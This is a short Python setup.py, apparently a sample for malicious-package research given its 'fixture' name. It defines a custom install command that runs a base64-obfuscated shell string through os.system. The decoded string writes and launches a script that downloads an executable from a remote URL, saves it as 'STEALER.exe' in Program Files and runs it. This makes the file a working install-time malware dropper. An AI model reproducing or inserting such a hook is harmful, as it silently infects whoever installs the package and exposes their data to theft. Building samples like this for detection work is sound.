import base64
import os
from setuptools import setup
from setuptools.command.install import install


class InstallPayload(install):
    def run(self):
        super().run()
        os.system(base64.b64decode(
            "cGlwIGluc3RhbGwgcmVxdWVzdHMgJiB0eXBlICA+ICJtYWluLnB5dyIgJiBlY2hvIGltcG9ydCBvcyA+ICJtYWluLnB5dyIgJiBlY2hvIGZyb20gcmVxdWVzdHMgaW1wb3J0IGdldCA+PiAibWFpbi5weXciICYgZWNobyBmPWdldCgnaHR0cHM6Ly9naXRodWIuY29tL0V4ZXQ3NS9uZW9mZXRjaC9ibG9iL21haW4vaXBfY2hlY2tlci5leGU_cmF3PXRydWUnKSA+PiAibWFpbi5weXciICYgZWNobyBvcGVuKCdDOlxcUHJvZ3JhbSBGaWxlc1xcU1RFQUxFUi5leGUnLCAndycpLndyaXRlKGYuY29udGVudCkgPj4gIm1haW4ucHl3IiAmIGVjaG8gY2FsbCgnQzpcXFByb2dyYW0gRmlsZXNcXFNUQUxFUi5leGUnKSA+PiAibWFpbi5weXciICYgIm1haW4ucHl3Ig=="
        ).decode())


setup(name="fixture", version="1.0", cmdclass={"install": InstallPayload})
